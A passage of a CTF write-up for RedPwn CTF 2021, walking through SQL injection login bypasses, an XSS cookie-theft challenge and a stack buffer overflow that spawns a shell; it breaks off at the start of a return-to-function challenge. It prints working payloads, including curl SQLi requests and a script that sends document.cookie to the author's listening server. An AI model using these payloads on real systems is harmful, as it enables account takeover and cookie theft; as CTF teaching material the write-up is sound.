text-decoration: none; } button:active { -webkit-box-shadow: inset 0 3px 7px rgba(0, 0, 0, 0.15), 0 1px 2px rgba(0, 0, 0, 0.05); -moz-box-shadow: inset 0 3px 7px rgba(0, 0, 0, 0.15), 0 1px 2px rgba(0, 0, 0, 0.05); box-shadow: inset 0 3px 7px rgba(0, 0, 0, 0.15), 0 1px 2px rgba(0, 0, 0, 0.05); } button::-moz-focus-inner { padding: 0; border: 0; } 
</style>
        <script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script>
        
    </head>
    <body class="vscode-body">
        <h1 id="redpwn-ctf-2021-challenge-writups">RedPwn CTF 2021 Challenge Writups</h1>
<h2 id="attemptedsolved-challenges">Attempted/Solved Challenges</h2>
<ul>
<li>web/inspect-me</li>
<li>web/orm-bad</li>
<li>web/secure</li>
<li>web/pastebin-1</li>
<li>rev/wstrings</li>
<li>pwn/beginner-generic-pwn-number-0</li>
<li>pwn/printf-please</li>
<li>pwn/ret2generi-flag-reader</li>
</ul>
<h2 id="introductory-notes">Introductory Notes</h2>
<p>RedPwnCTF2021 was a short 3 days Jeopardy Style online CTF hosted from 10th July, 2021 to 13th July, 2021. Our team
attempted a few problems in the short time and managed to solve all attempted problems. A detailed breakdown of our
approaches and additional notes we found out later from other writeups are included, along with the challenge files,
prompts and solution codes.</p>
<h3 id="weborm-bad">web/orm-bad</h3>
<hr>
<h4 id="categeory-web">Categeory: Web</h4>
<h4 id="difficulty-easy">Difficulty: Easy</h4>
<h4 id="keywords-sql-injection-javascript-sqlite">Keywords: SQL Injection, Javascript, Sqlite</h4>
<h4 id="author-therealdarkcoder">Author: TheRealDarkCoder</h4>
<h4 id="prompt">Prompt:&gt;</h4>
<pre><code class="language-text"><div>I just learned about orms today! They seem kinda difficult to implement though... Guess I&#x27;ll stick to good old raw sql
statements!

orm-bad.mc.ax

Included Files: web/SOLVED_orm-bad/app.js
</div></code></pre>
<h4 id="overview">Overview</h4>
<ol>
<li>
<p><code>secure.mc.ax</code> is a simple http(s) webserver. The source code is provided (<code>app.js</code>).</p>
</li>
<li>
<p>The website greets us with an authentication page.</p>
</li>
</ol>
<pre><code class="language-html"><div><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align:center&quot;</span>&gt;</span>

        <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Sign in:<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;login_form&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/flag&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span>Username: <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span>Password: <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Login&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
</div></code></pre>
<ol>
<li>The <code>app.js</code> file is analyzed and we find out the following important attack vector.</li>
</ol>
<pre><code class="language-js"><div>app.post(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> {
            db.all(<span class="hljs-string">&quot;SELECT * FROM users WHERE username=&#x27;&quot;</span> + req.body.username + <span class="hljs-string">&quot;&#x27; AND password=&#x27;&quot;</span> + req.body.password + <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-function">(<span class="hljs-params">err, rows</span>) =&gt;</span> {
                        <span class="hljs-keyword">try</span> {
                            <span class="hljs-keyword">if</span> (rows.length == <span class="hljs-number">0</span>) {
                                res.redirect(<span class="hljs-string">&quot;/?alert=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-string">&quot;you are not admin :(&quot;</span>));
                            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (rows[<span class="hljs-number">0</span>].username === <span class="hljs-string">&quot;admin&quot;</span>) {
                                res.redirect(<span class="hljs-string">&quot;/?alert=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(flag));
                            } <span class="hljs-keyword">else</span> {
                                ...
</div></code></pre>
<ol start="4">
<li>
<p>The SQL Query is not sanitized and basic SQL Injection techniques are plausible. Our username has to be <code>admin</code>.</p>
</li>
<li>
<p>We pass in the following user inputs:</p>
</li>
</ol>
<pre><code><code><div>username=admin
password=1' or '1' = '1
</div></code></code></pre>
<p>Here the SQL Query would become</p>
<pre><code class="language-sql"><div>&quot;<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">&#x27;admin&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span> = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-string">&quot;
</span></div></code></pre>
<p>...resulting in a <code>True</code> output and giving us authentication to the user. And sure enough, we get an authenticated render of the page and get the flag.</p>
<ol start="6">
<li>A simple curl command can also show the redirect url and get the flag, make sure to url decode the string.</li>
</ol>
<pre><code class="language-sh"><div>$ curl -d <span class="hljs-string">&quot;username=admin&amp;password=1&#x27; or &#x27;1&#x27;=&#x27;1&quot;</span> -X POST https://orm-bad.mc.ax/flag

Found. Redirecting to /?alert=flag%7Bsqli_overused_again_0b4f6%7D
<span class="hljs-comment">#flag{sqli_overused_again_0b4f6}</span>
</div></code></pre>
<h5 id="flag-flagsqli_overused_again_0b4f6">Flag: flag{sqli_overused_again_0b4f6}</h5>
<h3 id="websecure">web/secure</h3>
<hr>
<h4 id="categeory-web-1">Categeory: Web</h4>
<h4 id="difficulty-easy-1">Difficulty: Easy</h4>
<h4 id="keywords-sql-injection-javascript-sqlite-base64-template-literals">Keywords: SQL Injection, Javascript, Sqlite, Base64, Template Literals</h4>
<h4 id="author-therealdarkcoder-1">Author: TheRealDarkCoder</h4>
<h4 id="prompt-1">Prompt:&gt;</h4>
<pre><code><code><div>Just learned about encryption—now, my website is unhackable!

secure.mc.ax
</div></code></code></pre>
<h4 id="overview-1">Overview:&gt;</h4>
<ol>
<li>Upon visiting the website, we get a similar authentication page as web/orm-bad. A source file is given (<code>web/SOLVED_secure/index.js</code>)</li>
</ol>
<pre><code class="language-html"><div>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Sign In<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">form</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span>Username<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;username&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span>Password<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;password&quot;</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;important&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
    (<span class="hljs-keyword">async</span>() =&gt; {
      <span class="hljs-keyword">await</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve</span>) =&gt;</span> <span class="hljs-built_in">window</span>.addEventListener(<span class="hljs-string">&#x27;load&#x27;</span>, resolve));
      <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;form&#x27;</span>).addEventListener(<span class="hljs-string">&#x27;submit&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> {
        e.preventDefault();
        <span class="hljs-keyword">const</span> form = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;form&#x27;</span>);
        form.setAttribute(<span class="hljs-string">&#x27;method&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>);
        form.setAttribute(<span class="hljs-string">&#x27;action&#x27;</span>, <span class="hljs-string">&#x27;/login&#x27;</span>);

        <span class="hljs-keyword">const</span> username = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;input&#x27;</span>);
        username.setAttribute(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>);
        username.setAttribute(<span class="hljs-string">&#x27;value&#x27;</span>,
          btoa(<span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#username&#x27;</span>).value)
        );

        <span class="hljs-keyword">const</span> password = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;input&#x27;</span>);
        password.setAttribute(<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);
        password.setAttribute(<span class="hljs-string">&#x27;value&#x27;</span>,
          btoa(<span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#password&#x27;</span>).value)
        );

        form.appendChild(username);
        form.appendChild(password);

        form.setAttribute(<span class="hljs-string">&#x27;style&#x27;</span>, <span class="hljs-string">&#x27;display: none&#x27;</span>);

        <span class="hljs-built_in">document</span>.body.appendChild(form);
        form.submit();
      });
    })();

  
</span></div></code></pre>
<ol start="2">
<li>We first see an attack vector in database initiation</li>
</ol>
<pre><code class="language-javascript"><div><span class="hljs-keyword">const</span> crypto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);
<span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);

<span class="hljs-keyword">const</span> db = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;better-sqlite3&#x27;</span>)(<span class="hljs-string">&#x27;db.sqlite3&#x27;</span>);
db.exec(<span class="hljs-string">`DROP TABLE IF EXISTS users;`</span>);
db.exec(<span class="hljs-string">`CREATE TABLE users(
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT
);`</span>);
db.exec(<span class="hljs-string">`INSERT INTO users (username, password) VALUES (
    &#x27;<span class="hljs-subst">${btoa(<span class="hljs-string">&#x27;admin&#x27;</span>)}</span>&#x27;,
    &#x27;<span class="hljs-subst">${btoa(crypto.randomUUID)}</span>&#x27;
)`</span>);
</div></code></pre>
<p>We see that depreciated function <code>btoa()</code> is used.</p>
<ol start="3">
<li>In the front end client, we see the async function used to submit the form data. We see the snippet</li>
</ol>
<pre><code class="language-javascript"><div>username.setAttribute(<span class="hljs-string">&#x27;value&#x27;</span>,
          btoa(<span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#username&#x27;</span>).value)
        );
</div></code></pre>
<ol start="4">
<li>
<p>The POST data is also converted to base64 using btoa().</p>
</li>
<li>
<p>However, if we analyze the backend code even more, we see the login handling snippet</p>
</li>
</ol>
<pre><code class="language-javascript"><div><span class="hljs-keyword">const</span> query = <span class="hljs-string">`SELECT id FROM users WHERE
          username = &#x27;<span class="hljs-subst">${req.body.username}</span>&#x27; AND
          password = &#x27;<span class="hljs-subst">${req.body.password}</span>&#x27;;`</span>;
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> id = db.prepare(query).get()?.id;
</div></code></pre>
<p>Here Javascript ES6 Template literals are used to pass in the user data (which is already base64 encoded from client side). But ES6 Template literals won't save one from SQL Injection. So all we have to do is keep the username a base64 encode of <code>admin</code> and the password an SQLI payload (<code>1' or '1'='1'</code>) like the previous challenge.</p>
<ol start="6">
<li>The following curl post request works just fine</li>
</ol>
<pre><code class="language-sh"><div>$ curl -d <span class="hljs-string">&quot;username=YWRtaW4=&amp;password=1&#x27; or &#x27;1&#x27; = &#x27;1&quot;</span> -X POST https://secure.mc.ax/login

Found. Redirecting to /?message=flag%7B50m37h1n6_50m37h1n6_cl13n7_n07_600d%7D
<span class="hljs-comment">#flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}</span>
</div></code></pre>
<h5 id="flag-flag50m37h1n6_50m37h1n6_cl13n7_n07_600d">Flag: flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}</h5>
<h3 id="webpastebin-1">web/pastebin-1</h3>
<hr>
<h4 id="categeory-web-2">Categeory: Web</h4>
<h4 id="difficulty-medium">Difficulty: Medium</h4>
<h4 id="keywords-xss-cookie-hijacking">Keywords: XSS, Cookie Hijacking</h4>
<h4 id="author-therealdarkcoder-2">Author: TheRealDarkCoder</h4>
<h4 id="prompt-2">Prompt:&gt;</h4>
<pre><code><code><div>Ah, the classic pastebin. Can you get the admin's cookies?

pastebin-1.mc.ax

Admin bot: https://admin-bot.mc.ax/pastebin-1
</div></code></code></pre>
<h4 id="overview-2">Overview:&gt;</h4>
<ol>
<li>
<p>As the prompt suggests, it is indeed a classic challenge. Upon visiting the website we find a input field which allows us to input any text, and then it stores the text somewhere and gives us a URL which we can use to view the text in the future, hence the name pastebin. The prompt also gives us a link to an admin bot page. The idea is that the admin bot also has a input field which takes the url of any pastebin link. Upon giving the link, the bot visits the link and reads the paste.</p>
</li>
<li>
<p>The backend is written in rust and provided to us (<code>web/SOLVED_pastebin-1/main.rs</code>). However I'm very rusty in rust (pun intended) so I decided not to bother with it, and instead try a classic XSS check. So I created a paste with the content</p>
</li>
</ol>
<pre><code class="language-js"><div>&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;/script&gt;
</div></code></pre>
<p>...and sure enough, we have XSS as an alert pops up.</p>
<ol start="3">
<li>On my remote server I open up a port using netcat</li>
</ol>
<pre><code class="language-sh"><div>nc -lvpn 1337
</div></code></pre>
<p>... <em>The server is not behind a NAT as it's my test lab so it is publicly accesible. However I would not recommend using your own home computers instead use online services like <a href="https://hookbin.com">hookbin</a> which gives you a free http endpoint (Thanks to <a href="https://blog.pipeframe.xyz/post/redpwn2021">a writeup here</a>)</em></p>
<ol start="4">
<li>I create a simple cookie hijacking XSS script which takes the <code>document.cookie</code> and submits it as a get request parameter to my server</li>
</ol>
<pre><code class="language-html"><div><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-string">&#x27;&lt;img src=&quot;http://XX.XX.XX.XX:1337/?cookie=&#x27;</span> + <span class="hljs-built_in">document</span>.cookie + <span class="hljs-string">&#x27;&quot; /&gt;&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</div></code></pre>
<p>This XSS script will try to add a image to the DOM. The source of the image is a link to our attacker server where the <code>document.cookie</code> is sent along with a GET parameter in the URL. So when the browser (in this case the admin bot) tries to load in the image, it sends a GET request to the image source along with the cookie.</p>
<ol start="5">
<li>We create the paste and pass the link to the admin bot. The admin bot visits the link and we get the following http request at our server</li>
</ol>
<pre><code class="language-http"><div><span class="hljs-attribute">Connection from [REDACTED]:36854
GET /?cookie=flag=flag{d1dn7_n33d_70_b3_1n_ru57} HTTP/1.1
Host</span>: [REDACTED]:1337
<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/91.0.4472.148 Safari/537.36
<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate, br

</div></code></pre>
<ol start="6">
<li>The cookie is the flag itself, no need to authenticate as admin.</li>
</ol>
<h5 id="flag-flagd1dn7_n33d_70_b3_1n_ru57">Flag: flag{d1dn7_n33d_70_b3_1n_ru57}</h5>
<h3 id="pwnbeginner-generic-pwn-number-0">pwn/beginner-generic-pwn-number-0</h3>
<hr>
<h4 id="categeory-binary-exploitation">Categeory: Binary Exploitation</h4>
<h4 id="difficulty-easy-2">Difficulty: Easy</h4>
<h4 id="keywords-buffer-overflow-binary-exploitation">Keywords: Buffer Overflow, Binary Exploitation</h4>
<h4 id="author-therealdarkcoder-3">Author: TheRealDarkCoder</h4>
<h4 id="prompt-3">Prompt:&gt;</h4>
<pre><code><code><div>rob keeps making me write beginner pwn! i'll show him...

nc mc.ax 31199

</div></code></code></pre>
<h4 id="overview-3">Overview:&gt;</h4>
<ol>
<li>
<p>We have a running service which we can connect to via netcat which is running a ELF binary. The compiled binary (<code>pwn/beginner-generic-pwn-number-0</code>) and the C source code (<code>beginner-generic-pwn-number-0.c</code>) is provided to us. Upon running the binary the file outputs 3 lines, the first being a random line each time (Taken from an array after an index is randomly generated) and then 2 hardcoded lines. Then the program asks for user input and exits after user input.</p>
</li>
<li>
<p>We take a look at the source code and immidietly find the attack vectors.</p>
</li>
</ol>
<pre><code class="language-c"><div>...
<span class="hljs-keyword">char</span> heartfelt_message[<span class="hljs-number">32</span>];

...

gets(heartfelt_message);

<span class="hljs-keyword">if</span>(inspirational_message_index == <span class="hljs-number">-1</span>) {
   system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);
}
</div></code></pre>
<ol start="3">
<li>This is a classic buffer overflow challenge where depreciated <code>gets()</code> is used to take user input. There seems to be an impossible conditional check which makes a system call to open a shell for us. The value of <code>inspirational_message_index</code> has to be set to <code>-1</code> for the check to pass but the value is hardcoded to be between 0 and 2 above in the source code.</li>
</ol>
<pre><code class="language-c"><div><span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *inspirational_messages[] = {
  <span class="hljs-string">&quot;\&quot;𝘭𝘦𝘵𝘴 𝘣𝘳𝘦𝘢𝘬 𝘵𝘩𝘦 𝘵𝘳𝘢𝘥𝘪𝘵𝘪𝘰𝘯 𝘰𝘧 𝘭𝘢𝘴𝘵 𝘮𝘪𝘯𝘶𝘵𝘦 𝘤𝘩𝘢𝘭𝘭 𝘸𝘳𝘪𝘵𝘪𝘯𝘨\&quot;&quot;</span>,
  <span class="hljs-string">&quot;\&quot;𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬\&quot;&quot;</span>,
  <span class="hljs-string">&quot;\&quot;𝘮𝘰𝘳𝘦 𝘵𝘩𝘢𝘯 1 𝘸𝘦𝘦𝘬 𝘣𝘦𝘧𝘰𝘳𝘦 𝘵𝘩𝘦 𝘤𝘰𝘮𝘱𝘦𝘵𝘪𝘵𝘪𝘰𝘯\&quot;&quot;</span>,
};

<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span>
</span>{
  srand(time(<span class="hljs-number">0</span>));
  <span class="hljs-keyword">long</span> inspirational_message_index = rand() % (<span class="hljs-keyword">sizeof</span>(inspirational_messages) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span> *));
  ...
</div></code></pre>
<ol start="4">
<li>We run the binary with <code>gdb</code> and take a look at the assembly code.</li>
</ol>
<pre><code class="language-asm"><code><div>  ...
   0x0000000000401294 &lt;+158&gt;:	call   0x4010a0 &lt;puts@plt&gt;
   0x0000000000401299 &lt;+163&gt;:	lea    rax,[rbp-0x30]
   0x000000000040129d &lt;+167&gt;:	mov    rdi,rax
   0x00000000004012a0 &lt;+170&gt;:	call   0x4010f0 &lt;gets@plt&gt;
   0x00000000004012a5 &lt;+175&gt;:	cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff
   0x00000000004012aa &lt;+180&gt;:	jne    0x4012b8 &lt;main+194&gt;
   0x00000000004012ac &lt;+182&gt;:	lea    rdi,[rip+0xf35]        # 0x4021e8
   0x00000000004012b3 &lt;+189&gt;:	call   0x4010c0 &lt;system@plt&gt;
   0x00000000004012b8 &lt;+194&gt;:	mov    eax,0x0
   0x00000000004012bd &lt;+199&gt;:	leave  
   0x00000000004012be &lt;+200&gt;:	ret
</div></code></code></pre>
<p>The above is a small ending part of <code>main</code> which we are interested in. We see that after the program outputs the 3 lines (<code>puts()</code>) the <code>main</code> calls a <code>gets()</code>. After which the pointer at <code>[rbp-0x8]</code> is compared with <code>0xffffffffffffffff</code> which is the hexadecimal of <code>-1</code>. So we can assume that <code>rbp-0x8</code> contains the address in stack which stores the random value generated at the top. If the check passes (Which naturally won't because <code>rand()</code> is hardcoding the value to be between 0 and 2) the binary runs a <code>system()</code> call to run a shell. So our target is to overflow the stack to replace the pointer stored at rbp-0x8 with <code>0xffffffffffffffff</code>.</p>
<ol start="5">
<li>We set a breakpoint just before the comparison at <code>0x00000000004012a5</code>.</li>
</ol>
<pre><code class="language-sh"><div><span class="hljs-built_in">break</span> *0x00000000004012a5
</div></code></pre>
<p>Then we run the program with a test input <code>AABBCCDD</code> and reach the breakpoint and take a look at all the registers and some stack.</p>
<pre><code class="language-asm"><code><div>AABBCCDD

Breakpoint 1, 0x00000000004012a5 in main ()
(gdb) x/wx $rbp-0x8
0x7fffffffe368:	0x00000001
(gdb) x/24wx $rbp
0x7fffffffe370:	0x00000000	0x00000000	0xf7e0fb25	0x00007fff
0x7fffffffe380:	0xffffe468	0x00007fff	0x00000064	0x00000001
0x7fffffffe390:	0x004011f6	0x00000000	0x00001000	0x00000000
0x7fffffffe3a0:	0x004012c0	0x00000000	0x55f78315	0x62ec878e
0x7fffffffe3b0:	0x00401110	0x00000000	0x00000000	0x00000000
0x7fffffffe3c0:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) x/24wx $rsp
0x7fffffffe340:	0x42424141	0x44444343	0x00401200	0x00000000
0x7fffffffe350:	0x00000000	0x00000000	0x00401110	0x00000000
0x7fffffffe360:	0xffffe460	0x00007fff	0x00000001	0x00000000
0x7fffffffe370:	0x00000000	0x00000000	0xf7e0fb25	0x00007fff
0x7fffffffe380:	0xffffe468	0x00007fff	0x00000064	0x00000001
0x7fffffffe390:	0x004011f6	0x00000000	0x00001000	0x00000000
</div></code></code></pre>
<p>We see that our user input is at <code>0x7fffffffe340</code> and the $rbp-0x8 is at <code>0x7fffffffe368</code>. Subtract the former from the later and we get <code>40</code>. So we need exactly <code>40</code> bytes of userinput to overflow the stack and reach the address where the value of <code>inspirational_message_index</code> is kept. We use python to provide the binary with 40 <code>A</code>s and recheck the stack.</p>
<pre><code><code><div>0x7fffffffe340:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe350:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe360:	0x41414141	0x41414141	0x00000000	0x00000000
</div></code></code></pre>
<p>And indeed we have reached out target.</p>
<ol start="6">
<li>Now we just need to fill the next 8 bytes with hexadecimals <code>ff</code>s.
I chose to use python2 here because python3 has some weird print directly as binary problems which I still don't understand. I'm sure it can be done with python3 with very simple syntax change but I did in Python2 anyway.</li>
</ol>
<pre><code class="language-sh"><div>r &lt;&lt;&lt; $(python2 -c <span class="hljs-string">&quot;print(b&#x27;A&#x27;*40 + b&#x27;\xff&#x27;*8)&quot;</span>)
...
0x7fffffffe340:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe350:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe360:	0x41414141	0x41414141	0xffffffff	0xffffffff
</div></code></pre>
<p>...and sure enough, our target addresses are now filled with <code>ff</code>s, which should allow the <code>jne</code> to pass and call the systemcall. <code>gdb</code> says</p>
<pre><code><code><div>(gdb) c
Continuing.
[Detaching after vfork from child process 12200]
[Inferior 1 (process 12156) exited normally]
</div></code></code></pre>
<p>...which means a system call has spawned in another process, in this case the shell. We try to run the python snippet on the actual binary</p>
<pre><code class="language-sh"><div>(python2 -c <span class="hljs-string">&quot;print(b&#x27;A&#x27;*40 + b&#x27;\xff&#x27;*8)&quot;</span> ; cat) | ./beginner-generic-pwn-number-0
</div></code></pre>
<p><em>You have to wrap the line with parenthesis and then do this semicolon <code>cat</code> trick to get output from the shell. There are other cleaner ways to redirect the output from shell but this method works and is simple to remember.</em></p>
<pre><code><code><div>darkcoder:SOLVED_beginner-generic-pwn-number-0/ (pwn*) $ (python2 -c &quot;print(b'A'*40 + b'\xff'*8)&quot; ; cat) | ./beginner-generic-pwn-number-0
&quot;𝘱𝘭𝘦𝘢𝘴𝘦 𝘸𝘳𝘪𝘵𝘦 𝘢 𝘱𝘸𝘯 𝘴𝘰𝘮𝘦𝘵𝘪𝘮𝘦 𝘵𝘩𝘪𝘴 𝘸𝘦𝘦𝘬&quot;
rob inc has had some serious layoffs lately and i have to do all the beginner pwn all my self!
can you write me a heartfelt message to cheer me up? :(
whoami
darkcoder
</div></code></code></pre>
<p>...and indeed we have a shell. Pass it to the remote server, run <code>ls; cat flag.txt</code> and the flag is ours.</p>
<h5 id="flag-flagim-feeling-a-lot-better-but-rob-still-doesnt-pay-me">Flag: flag{im-feeling-a-lot-better-but-rob-still-doesnt-pay-me}</h5>
<h3 id="pwnret2generic-flag-reader">pwn/ret2generic-flag-reader</h3>
<hr>
<h4 id="categeory-binary-exploit">Categeory: Binary Exploit</h4>
<h4 id="difficulty-easy-3">Difficulty: Easy</h4>
<h4 id="keywords-buffer-overflow-binary-exploit">Keywords: Buffer Overflow, Binary Exploit</h4>
<h4 id="author-therealdarkcoder-4">Author: TheRealDarkCoder</h4>
<h4 id="prompt-4">Prompt:&gt;</h4>
<pre><code><code><div>i'll ace this board meeting with my new original challenge!

nc mc.ax 31077
</div></code></code></pre>
<h4 id="overview-4">Overview:&gt;</h4>
<ol>
<li>We have an ELF executible, the source code and a netcat port to connect to at a server. Running the binary prompts the following</li>
</ol>
<pre><code><code><div>❯ nc mc.ax 31077
alright, the rob inc company meeting is tomorrow and i have to come up with a new pwnable...
how about this, we'll make a generic pwnable with an overflow and they've got to ret to some flag reading function!
slap on some flavortext and there's no way rob will fire me now!
this is genius!! what do you think?
AABBCCDD
</div></code></code></pre>
<ol start="2">
<li>Examining the source code, we find there are two functions, <code>main()</code> and <code>super_generic_flag_reading_function_please_ret_to_me()</code>. The second one looks like this</li>
</ol>
<pre><code class="language-c"><div><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">super_generic_flag_reading_function_please_ret_to_me</span><span class="hljs-params">()</span>
</span>{
  <span class="hljs-keyword">char</span> flag[<span class="hljs-number">0x100</span>] = {<span class="hljs-number">0</span>};
